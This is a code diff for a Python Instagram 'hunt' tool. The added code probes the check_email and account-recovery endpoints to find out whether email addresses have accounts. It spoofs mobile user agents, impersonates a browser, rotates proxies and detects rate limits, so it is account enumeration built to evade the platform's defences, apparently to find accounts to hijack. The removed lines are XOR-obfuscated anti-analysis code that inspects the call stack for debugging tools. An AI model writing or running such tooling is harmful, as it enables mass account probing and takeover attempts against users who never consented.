+    r"no account found|couldn.?t find|user not found|doesn.?t match",
+    re.I,
+)
+_HUNT_BLOKS_SCAN_MAX = 400000
+# Miss bloks bodies are ~41KB; hits are ~400KB+. Stop streaming once miss size is exceeded.
+_HUNT_BLOKS_MISS_CEILING = 48000
+_HUNT_MOBILE_CHECK_EMAIL_URL = "https://i.instagram.com/api/v1/users/check_email/"
+# Competitor-style minimal check_email — old UA, tiny body (~1–3s vs full mobile headers).
+_HUNT_CHECK_EMAIL_FAST_UA = (
+    "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; "
+    "samsung; SM-G973F; x86_64; tablet; en_US; kirin)"
+)
+_HUNT_CHECK_EMAIL_FAST_TIMEOUT = (3, 8)
+_HUNT_MOBILE_ASSISTED_RECOVERY_URL = (
+    "https://i.instagram.com/api/v1/accounts/assisted_account_recovery/"
+)
+_IG_MOBILE_UA = (
+    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; "
+    "samsung; SM-A235F; a23; qcom; en_IN; 704872281)"
+)
+_IG_MOBILE_APP_ID = "567067343352427"
+_PROFILE_WEB_URL = "https://i.instagram.com/api/v1/users/web_profile_info/"
+_PROFILE_MEDIA_EDGE_RE = re.compile(
+    r'"edge_owner_to_timeline_media"\s*:\s*\{\s*"count"\s*:\s*(\d+)',
+    re.I,
+)
+_PROFILE_MEDIA_COUNT_RE = re.compile(r'"media_count"\s*:\s*(\d+)', re.I)
+
+goodig = 0
+badig = 0
+sess = requests.session()
+session = requests.session()
+_ig_http_adapter = HTTPAdapter(
+    pool_connections=IG_HTTP_POOL_SIZE,
+    pool_maxsize=IG_HTTP_POOL_SIZE,
+    max_retries=0,
+)
+session.mount("https://", _ig_http_adapter)
+session.mount("http://", _ig_http_adapter)
+_ig_graphql_local = threading.local()
+_hunt_http_local = threading.local()
+
+
+def _get_hunt_http_session():
+    """Per-thread keep-alive for ig_lookup + gmail during hunt_cycle."""
+    http = getattr(_hunt_http_local, "session", None)
+    if http is None:
+        http = requests.Session()
+        adapter = HTTPAdapter(
+            pool_connections=3,
+            pool_maxsize=3,
+            max_retries=0,
+        )
+        http.mount("https://", adapter)
+        http.mount("http://", adapter)
+        _hunt_http_local.session = http
+    return http
+
+
+def _get_hunt_curl_session():
+    """curl_cffi for hunt IG/Gmail — Termux only; desktop uses requests (curl+threads crashes)."""
+    if not _IS_TERMUX:
+        return None
+    http = getattr(_hunt_http_local, "curl_session", None)
+    if http is None:
+        try:
+            from curl_cffi import requests as curl_requests
+        except ImportError:
+            return None
+        http = curl_requests.Session(impersonate="chrome131_android")
+        _hunt_http_local.curl_session = http
+    return http
+
+
+def _hunt_lookup_timeout():
+    return (_HUNT_LOOKUP_CONNECT, HUNT_LOOKUP_TIMEOUT)
+
+
+def _google_accounts_request(method, url, *, headers, timeout, cookies=None, data=None, params=None):
+    """Token/signup calls — Termux uses curl_cffi Android impersonation."""
+    if _IS_TERMUX:
+        try:
+            from curl_cffi import requests as curl_requests
+            http = curl_requests.Session(impersonate="chrome131_android")
+            fn = http.post if method.upper() == "POST" else http.get
+            return fn(
+                url,
+                headers=headers,
+                timeout=timeout,
+                cookies=cookies,
+                data=data,
+                params=params,
+            )
+        except Exception:
+            pass
+    fn = requests.post if method.upper() == "POST" else requests.get
+    return fn(
+        url,
+        headers=headers,
+        timeout=timeout,
+        cookies=cookies,
+        data=data,
+        params=params,
+    )
+
+
+def _hunt_http_post(url, *, data, headers, timeout, cookies=None, params=None):
+    if vps_proxy_enabled() and is_instagram_url(url):
+        for proxies in proxy_attempts(proxy_tries=_VPS_PROXY_TRIES):
+            curl_http = _get_hunt_curl_session()
+            try:
+                kw = {
+                    "data": data,
+                    "headers": headers,
+                    "timeout": timeout,
+                    "cookies": cookies,
+                    "params": params,
+                }
+                if proxies:
+                    kw["proxies"] = proxies
+                if curl_http is not None:
+                    resp = curl_http.post(url, **kw)
+                else:
+                    resp = _get_hunt_http_session().post(url, **kw)
+                if proxies and proxy_http_status_retry(getattr(resp, "status_code", 0)):
+                    proxy_mark_bad(proxies)
+                    continue
+                return resp
+            except Exception:
+                if proxies:
+                    proxy_mark_bad(proxies)
+                continue
+        return _get_hunt_http_session().post(
+            url,
+            data=data,
+            headers=headers,
+            timeout=timeout,
+            cookies=cookies,
+            params=params,
+        )
+    curl_http = _get_hunt_curl_session()
+    if curl_http is not None:
+        try:
+            return curl_http.post(
+                url,
+                data=data,
+                headers=headers,
+                timeout=timeout,
+                cookies=cookies,
+                params=params,
+            )
+        except Exception:
+            pass
+    return _get_hunt_http_session().post(
+        url,
+        data=data,
+        headers=headers,
+        timeout=timeout,
+        cookies=cookies,
+        params=params,
+    )
+
+
+def _hunt_http_post_scan(url, *, data, headers, timeout, hit_needle, cookies=None, params=None):
+    """Chunked POST — abort download once IG hit/miss/rate-limit is known."""
+    hit_b = (hit_needle or "").encode("utf-8", errors="ignore")
+    neg_markers = (
+        b"no account found",
+        b"couldn't find",
+        b"user not found",
+        b"rate limit",
+        b"please try again later",
+    )
+    pos_markers = (
+        b"sent a code to",
+        b"sent you an email",
+        b"email sent for recovery",
+        b"get back into your account",
+    )
+
+    def _scan_one(http, proxies=None):
+        kw = {
+            "data": data,
+            "headers": headers,
+            "timeout": timeout,
+            "cookies": cookies,
+            "params": params,
+            "stream": True,
+        }
+        if proxies:
+            kw["proxies"] = proxies
+        resp = http.post(url, **kw)
+        code = int(getattr(resp, "status_code", 0) or 0)
+        try:
+            if code == 429:
+                return code, "rate_limited"
+            buf = bytearray()
+            stream_fn = getattr(resp, "iter_content", None)
+            if callable(stream_fn):
+                for chunk in stream_fn(chunk_size=65536):
+                    if not chunk:
+                        continue
+                    buf.extend(chunk)
+                    if hit_b and hit_b in buf:
+                        return code, "hit"
+                    low = bytes(buf).lower()
+                    if any(marker in low for marker in pos_markers):
+                        return code, "hit"
+                    if any(marker in low for marker in neg_markers):
+                        if b"rate limit" in low or b"please try again later" in low:
+                            return code, "rate_limited"
+                        return code, "miss"
+                    if len(buf) >= _HUNT_BLOKS_MISS_CEILING and not (
+                        hit_b and hit_b in buf
+                    ):
+                        return code, "miss"
+                    if len(buf) > _HUNT_BLOKS_SCAN_MAX:
+                        break
+            else:
+                buf.extend(resp.content or b"")
+            low = bytes(buf).lower()
+            if hit_b and hit_b in buf:
+                return code, "hit"
+            if any(marker in low for marker in pos_markers):
+                return code, "hit"
+            if b"rate limit" in low or b"please try again later" in low:
+                return code, "rate_limited"
+            return code, "miss"
+        finally:
+            try:
+                resp.close()
+            except Exception:
+                pass
+
+    attempts = (
+        list(proxy_attempts(proxy_tries=_VPS_PROXY_TRIES))
+        if vps_proxy_enabled() and is_instagram_url(url)
+        else [None]
+    )
+    # M1 bloks scan: requests only — curl_cffi stream+abort corrupts heap under parallel load.
+    clients = [_get_hunt_http_session()]
+    for proxies in attempts:
+        for http in clients:
+            try:
+                return _scan_one(http, proxies)
+            except Exception:
+                if proxies:
+                    proxy_mark_bad(proxies)
+                continue
+    return 0, "error"
+
+
+def _warm_hunt_lookup_thread():
+    """Per-thread TLS warmup — first lookup skips cold-handshake penalty."""
+    if getattr(_hunt_http_local, "warmed", False):
+        return
+    _hunt_http_local.warmed = True
+    _hunt_ig_device_ctx()
+    try:
+        load(force_refresh=False)
     except Exception:
-        ЈЉСИМижЧПгВ()
-    if not getattr(ДУЏлШовУНйыМь,'lstrip')().startswith(getattr(УжЕЛЄйЙЙЕэГЭЂ,'lstrip')()):
-        ЈЉСИМижЧПгВ()
-ОЂеъІОидАкСЮиШхЃщлМ()
-def НЮаТЋжбнІмС():
-    ШЬЙЃПХкьЧАЧяииІЭОР='ЭбХЄоэЎ'
+        pass
     try:
-        ХЋАэАГГЪцйгЭПипйе=__import__(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1092, 1119, 1110, 1140, 1115, 1070, 1146])))
-        ЫЅецЂМЈхЉШзНъьЃтЩЛЋ=__import__(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1090, 1090])))
-        ІиОМжЭЍЕгсбЖ=(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1097, 1108, 1094, 1142, 1095, 1085, 1146, 1138, 1108, 1099, 1127, 1100, 1076, 1150, 1113, 1108, 1089, 1066, 1102, 1076])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1112, 1119, 1110, 1136, 1115, 1060, 1120, 1138, 1117, 1092, 1149, 1115, 1087, 1056, 1117, 1096])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1103, 1091, 1088, 1125, 1109, 1042, 1133, 1093, 1104, 1097, 1128, 1115, 1059, 1129, 1096, 1055, 1109, 1149])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1117, 1108, 1088, 1128, 1121, 1057, 1135, 1108, 1108, 1111, 1066, 1102, 1076])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1096, 1097, 1105, 1142, 1119, 1070, 1146, 1138, 1117, 1092, 1149, 1115, 1087, 1056, 1117, 1096])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1092, 1119, 1089, 1121, 1102, 1064, 1120, 1097, 1108, 1099, 1136, 1121, 1083, 1135, 1112, 1117, 1105, 1115, 1115, 1077, 1146, 1119, 1104, 1094, 1136, 1040, 1085, 1143])))
-        ркАлЎЦпЪГРЖДиІ=(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1026, 1110, 1101, 1133, 1114, 1087, 1135, 1026])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1026, 1111, 1111, 1133, 1114, 1068, 1057])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1098, 1113, 1100, 1120, 1100, 1068, 1105])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1117, 1096, 1094, 1120, 1117])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1112, 1119, 1094, 1131, 1107, 1085, 1143, 1089, 1108])), ''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1097, 1108, 1094, 1131, 1107, 1085, 1143, 1089, 1108])))
-        for сиЫОДЄБКкЇдэк in ХЋАэАГГЪцйгЭПипйе.stack():
-            ЁкФтрЋКцЮЦД=(getattr(сиЫОДЄБКкЇдэк,'filename')or '').lower()
-            жлбЛНЇВзялЂДХШш=getattr(getattr(ЫЅецЂМЈхЉШзНъьЃтЩЛЋ,'path'),'basename')(ЁкФтрЋКцЮЦД)
-            if жлбЛНЇВзялЂДХШш in ІиОМжЭЍЕгсбЖ or any(уЪЫЫЃКЈяпнМЋПлЃ in ЁкФтрЋКцЮЦД for уЪЫЫЃКЈяпнМЋПлЃ in ркАлЎЦпЪГРЖДиІ):
-                ЈЉСИМижЧПгВ()
-    except Exception:pass
-НЮаТЋжбнІмС()
+        _gmail_token_parts(force_tl=False)
+    except Exception:
+        pass
+    warmup_urls = (
+        "https://www.instagram.com/",
+        "https://i.instagram.com/",
+        "https://accounts.google.com/",
+    )
+    timeout = (2, 5) if _IS_TERMUX else (2, 4)
+    curl_http = _get_hunt_curl_session()
+    for url in warmup_urls:
+        try:
+            if vps_proxy_enabled() and is_instagram_url(url):
+                _ig_http_get(url, timeout=timeout)
+                continue
+            if curl_http is not None:
+                curl_http.get(url, timeout=timeout)
+            else:
+                _get_hunt_http_session().get(url, timeout=timeout)
+        except Exception:
+            pass
 
-def мюФЩРЦчФцЫЙЪЩулЪШ():
-    ЙЈЁСщЦЂПЮчЫ='рИШЃЩ'
-    ьсЬпІрпХЕаоМЧ=__import__(''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1074, 1145, 1094, 1127, 1094, 1069])))
-    шЫтТЗрвЧЄІЍЁЧ=__import__(''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1076, 1137, 1093, 1126])))
-    ХтмЮШъвщЦПмКЯеЋо=__import__(''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1075, 1121, 1115])))
-    соЅЅъМЪщдЪЇд=''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1028, 1149, 1118, 1126, 1093, 1071, 1128, 1105, 1126, 1115, 1120, 1135, 1097, 1133, 1117, 1075, 1080, 1116, 1132, 1033, 1065, 1142, 1102, 1132, 1115, 1069, 1080, 1105, 1132, 1116, 1120, 1132, 1088, 1122, 1117, 1120, 1121, 1095, 1142, 1033, 1057, 1130, 1101, 1059, 1118, 1061, 1145, 1091, 1059, 9277, 1120, 1121, 1095, 1142, 1033, 1064, 1145, 1118, 1126, 1033, 1068, 1149, 1115, 1136, 1033, 1058, 1130, 1097, 1130, 1095, 1120, 1147, 1101, 1135, 1093, 1075, 1078, 1078, 1111, 1089, 1065, 1131, 1032, 1139, 1096, 1059, 1139, 1101, 1137, 1033, 1059, 1143, 1115, 1143, 1114, 1120, 1141, 1095, 1137, 1100, 1120, 1146, 1114, 1122, 1088, 1070, 1080, 1099, 1126, 1093, 1068, 1131, 1032, 1143, 1089, 1057, 1142, 1032, 1146, 1094, 1077, 1080, 1088, 1122, 1119, 1061, 1078, 1078, 1114, 1094, 1077, 1080, 1093, 1130, 1114, 1075, 1149, 1100, 1059, 1117, 1064, 1149, 1032, 1136, 1090, 1065, 1140, 1092, 1136, 1029, 1120, 1139, 1089, 1127, 1101, 1071, 1078, 1078, 1101, 1094, 1120, 1141, 1097, 1133, 1095, 1070, 1142, 1094, 1059, 9277, 1120, 1128, 1117, 1143, 1033, 1076, 1136, 1101, 1059, 1089, 1061, 1120, 1032, 1126, 1101, 1065, 1132, 1095, 1137, 1033, 1060, 1143, 1119, 1133, 1031, 1118, 1116, 1133, 1109, 1132, 1036, 1111, 1144, 1114, 1132, 1042, 1080, 1115, 1122, 1104, 1075, 1058, 1032, 1124, 1094, 1120, 1140, 1101, 1122, 1115, 1070, 1080, 1144, 1146, 1117, 1064, 1143, 1094, 1059, 1103, 1065, 1130, 1115, 1143, 1029, 1120, 1132, 1088, 1126, 1095, 1120, 1147, 1095, 1134, 1100, 1120, 1146, 1097, 1120, 1090, 1134, 1030, 1137, 1132, 1116, 1074, 1080, 1135, 1131, 1088, 1060, 1130, 1097, 1059, 1103, 1071, 1140, 1100, 1126, 1115, 1120, 1147, 1097, 1135, 1093, 1061, 1148, 1032, 9239, 1033, 1065, 1132, 1039, 1136, 1033, 1061, 1141, 1098, 1122, 1115, 1074, 1145, 1115, 1136, 1100, 1060, 1080, 1102, 1132, 1115, 1120, 1121, 1095, 1142, 1031, 1118, 1118, 1114, 1130, 1101, 1057, 1080, 1095, 1133, 1033, 1081, 1143, 1117, 1137, 1033, 1072, 1136, 1095, 1133, 1100, 1120, 1135, 1095, 1133, 1038, 1076, 1080, 1115, 1122, 1119, 1061, 1080, 1116, 1131, 1088, 1075, 1080, 1112, 1126, 1115, 1075, 1143, 1094, 1122, 1093, 1065, 1132, 1105, 1069, 1079, 1049, 1143, 1117, 1059, 1114, 1076, 1130, 1089, 1139, 1113, 1061, 1148, 1032, 1143, 1089, 1061, 1080, 1088, 1126, 1096, 1060, 1149, 1114, 1059, 1093, 1065, 1139, 1101, 1059, 1104, 1071, 1133, 1032, 1136, 1117, 1074, 1137, 1112, 1059, 1101, 1065, 1151, 1094, 1130, 1117, 1081, 1078, 1078, 1105, 1100, 1078, 1149, 1114, 1136, 1100, 1120, 1135, 1088, 1122, 1117, 1151, 1080, 1137, 1132, 1116, 1120, 1147, 1097, 1133, 1038, 1076, 1080, 1101, 1141, 1100, 1070, 1080, 1102, 1132, 1115, 1079, 1145, 1114, 1127, 1031, 1118, 1108, 1101, 1136, 1114, 1120, 1140, 1095, 1124, 1088, 1059, 1076, 1032, 1134, 1094, 1074, 1149, 1032, 1120, 1094, 1072, 1137, 1117, 1134, 1033, 9300, 1080, 1099, 1135, 1096, 1075, 1131, 1089, 1120, 1031, 1118, 1100, 1097, 1134, 1113, 1061, 1130, 1032, 1127, 1100, 1076, 1149, 1099, 1143, 1100, 1060, 1078, 1032, 1094, 1102, 1071, 1080, 1100, 1126, 1093, 1061, 1132, 1101, 1127, 1031, 1118, 1100, 1088, 1130, 1114, 1120, 1131, 1099, 1137, 1088, 1072, 1132, 1032, 1130, 1114, 1120, 1128, 1114, 1132, 1117, 1061, 1147, 1116, 1126, 1101, 1120, 1146, 1105, 1059, 1129, 1028, 1149, 1118, 1126, 1093, 1071, 1128, 1105, 1126, 1115, 1120, 9228, 1032, 1146, 1094, 1077, 1087, 1114, 1126, 1033, 1070, 1143, 1116, 1069, 1079, 1033, 1142, 1102, 1130, 1095, 1065, 1132, 1101, 1059, 1093, 1071, 1143, 1112, 1059, 1116, 1070, 1140, 1095, 1120, 1090, 1061, 1148, 1042, 1059, 1096, 1059, 1136, 1089, 1126, 1119, 1061, 1141, 1101, 1133, 1117, 1120, 1087, 1147, 1120, 1115, 1065, 1128, 1116, 1059, 1122, 1065, 1148, 1100, 1130, 1100, 1127, 1078, 1078, 1114, 1094, 1077, 1130, 1032, 1090, 1146, 1044, 1080, 1119, 1122, 1093, 1067, 1080, 1088, 1122, 1114, 1120, 1132, 1088, 1126, 1033, 1061, 1142, 1101, 1137, 1102, 1081, 1080, 1095, 1125, 1033, 1057, 1080, 1092, 1132, 1114, 1076, 1080, 1116, 1132, 1116, 1074, 1137, 1115, 1143, 1031, 1118, 1114, 1097, 1136, 1100, 1144, 1069, 1032, 1130, 1114, 1070, 1087, 1116, 1059, 1096, 1120, 1128, 1101, 1137, 1114, 1071, 1142, 1097, 1135, 1088, 1076, 1121, 1032, 1143, 1115, 1057, 1137, 1116, 1069, 1079, 1048, 1111, 1146, 1059, 1088, 1075, 1142, 1039, 1143, 1033, 1064, 1145, 1114, 1127, 1033, 9300, 1080, 1105, 1132, 1116, 1074, 1080, 1092, 1130, 1103, 1061, 1080, 1099, 1131, 1094, 1065, 1147, 1101, 1136, 1033, 1057, 1130, 1101, 1069, 1079, 1040, 1149, 1101, 1135, 1033, 1071, 1142, 1101, 1059, 1093, 1057, 1121, 1101, 1137, 1029, 1120, 1147, 1114, 1146, 1033, 1062, 1143, 1114, 1059, 1114, 1065, 1120, 1032, 1134, 1094, 1074, 1149, 1030, 1053, 1136, 1071, 1133, 1032, 1140, 1096, 1070, 1132, 1101, 1127, 1033, 1075, 1143, 1117, 1137, 1098, 1061, 1080, 9276, 1059, 1089, 1061, 1130, 1101, 1060, 1114, 1120, 1137, 1094, 1125, 1088, 1070, 1137, 1116, 1126, 1033, 1072, 1130, 1089, 1133, 1117, 1075, 1080, 1089, 1133, 1114, 1076, 1149, 1097, 1127, 1031, 1118, 1114, 1114, 1122, 1088, 1070, 1080, 1099, 1126, 1093, 1068, 1131, 1042, 1059, 1053, 1136, 1068, 1032, 1101, 1094, 1076, 1080, 1134, 1132, 1116, 1070, 1148, 1030, 1053, 1133, 1061, 1134, 1101, 1135, 1094, 1072, 1121, 1101, 1137, 1033, 1065, 1131, 1032, 1133, 1094, 1076, 1080, 1147, 1111, 1132, 1033, 1110, 1032, 9239, 1033, 1081, 1143, 1117, 1060, 1115, 1061, 1080, 1115, 1143, 1088, 1068, 1140, 1032, 1121, 1094, 1076, 1136, 1032, 1135, 1094, 1075, 1137, 1094, 1124, 1031, 1118, 1103, 1101, 1122, 1090, 1120, 1145, 1116, 1143, 1100, 1069, 1128, 1116, 1069, 1033, 1043, 1132, 1114, 1132, 1095, 1063, 1149, 1114, 1059, 1098, 1071, 1150, 1102, 1126, 1100, 1120, 1130, 1101, 1120, 1094, 1069, 1141, 1101, 1133, 1101, 1061, 1148, 1030, 1053, 1149, 1064, 1149, 1032, 1132, 1095, 1068, 1121, 1032, 1143, 1089, 1065, 1142, 1103, 1059, 1104, 1071, 1133, 1032, 1127, 1100, 1059, 1130, 1105, 1139, 1117, 1061, 1148, 1032, 1130, 1114, 1120, 1141, 1105, 1059, 1113, 1057, 1132, 1089, 1126, 1095, 1059, 1149, 1030, 1053, 1122, 1061, 1149, 1112, 1059, 1102, 1071, 1137, 1094, 1124, 1033, 9300, 1080, 1116, 1131, 1100, 1120, 1140, 1095, 1132, 1113, 1120, 1140, 1095, 1141, 1100, 1075, 1080, 1099, 1132, 1092, 1072, 1145, 1094, 1146, 1031, 1118, 1104, 1095, 1133, 1100, 1075, 1132, 1032, 1122, 1116, 1060, 1137, 1116, 1081, 1033, 1081, 1143, 1117, 1059, 1093, 1071, 1131, 1101, 1069, 1033, 1043, 1145, 1118, 1122, 1102, 1061, 1080, 1097, 1142, 1101, 1065, 1132, 1042, 1059, 1104, 1071, 1133, 1032, 1133, 1100, 1078, 1149, 1114, 1059, 1089, 1057, 1148, 1032, 1122, 1033, 1059, 1136, 1097, 1133, 1098, 1061, 1078, 1078, 1088, 1094, 1070, 1132, 1097, 1120, 1117, 1120, 1112, 1132, 1126, 1119, 1061, 1140, 1095, 1139, 1104, 1061, 1130, 1032, 1140, 1089, 1061, 1142, 1032, 1146, 1094, 1077, 1080, 1103, 1137, 1094, 1079, 1080, 1097, 1059, 1114, 1067, 1137, 1092, 1135, 1033, 1076, 1130, 1101, 1126, 1031]))
-    ЁуГньгшФЎЗбЦЭ=tuple(соЅЅъМЪщдЪЇд.split('\x1e'))
-    while (1):
-        ЈЖщЮКьЃбЗцЙЮЫЅОгтЩХ=ьсЬпІрпХЕаоМЧ.choice(ЁуГньгшФЎЗбЦЭ)
-        print(''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1028, 1117, 1150, 1094, 1125, 1039, 1096, 1137, 1094, 1147, 1120, 1099, 1129, 1114, 1146])));print(''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1120, 1080, 1032, 1116, 1142, 1055, 1095, 1143, 1116, 1142, 1055, 1095, 1143, 1116, 1142, 1055, 1095, 1143, 1116, 1142, 1055, 1095, 1143, 1116, 1142, 1055, 1095])));print(''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1259]))+ЈЖщЮКьЃбЗцЙЮЫЅОгтЩХ+''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1275])));print(''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1024, 1116, 1101, 1141, 1100, 1068, 1143, 1112, 1146, 1100, 1074])));print(''.join(chr(кАЁТЃйАеечЗнтНюедпц^ord(ЙЈЁСщЦЂПЮчЫ[ХТЯяяЦУюЧРОМ%len(ЙЈЁСщЦЂПЮчЫ)])) for ХТЯяяЦУюЧРОМ,кАЁТЃйАеечЗнтНюедпц in enumerate([1055, 1095, 1143, 1116, 1142, 1055, 1095, 1143, 1116, 1142, 1055, 1095, 1143, 1116, 1142, 1055, 1095, 1143, 1116, 1142, 1055, 1095, 1143, 1116, 1142, 1055, 1095, 1143])))
-        шЫтТЗрвЧЄІЍЁЧ.sleep(0.35);ХтмЮШъвщЦПмКЯеЋо.stdout.flush()
-_89d6117eea = bytes([163, 127, 231, 125, 95, 103, 70, 201, 124, 219, 108, 175, 105, 222, 199, 132])
-_b497179f7e = (
-        bytes([176, 229, 193, 209, 255, 19, 128, 21, 64, 71]),
-        bytes([190, 250, 153, 207, 154, 211, 100, 189, 118, 0]),
-        bytes([183, 110, 147, 211, 230, 189, 0, 119, 163, 116]),
-        bytes([160, 101, 118, 134, 252, 29, 53, 3, 70, 171]),
-        bytes([206, 226, 103, 124, 174, 208, 60, 229, 32, 159])
+
+def _preload_hunt_lookup_caches():
+    """Background warm — must not block /alive (joint probes this immediately)."""
+    _warm_hunt_lookup_thread()
+    _start_gmail_token_maintainer()
+    try:
+        get_TL(force=False)
+    except Exception:
+        pass
+    try:
+        _gmail_token_parts(force_tl=False)
+    except Exception:
+        pass
+    try:
+        load(force_refresh=False)
+    except Exception:
+        pass
+
+
+_hunt_lookup_executor = ThreadPoolExecutor(
+    max_workers=HUNT_CYCLE_MAX_CONCURRENT + 20,
+    thread_name_prefix="hunt-lookup",
+    initializer=_warm_hunt_lookup_thread,
 )
-_5e2635f739 = (
-        'SGnsOxrhf588R0IpzLPYPXyN88/7SxNH+1F6v4rh4VCu7753x+Y/exua3w',
-        '1CYL/ywcQb3pfiA2XuERaAr7ZOGX//E7aMyyErtXEBqc2TPHJCsYb5kAbq',
-        'kB4Q28IL24Bcd2fnWs28dVaJ7TvKMxCVDV0lhQjCbBbsjPNwzg7Ideo9t6',
-        'm2l3EggEX4+A343RaZQihmReUzEIGofjSYNIPw33YLX/GXlyny4imBlKCo',
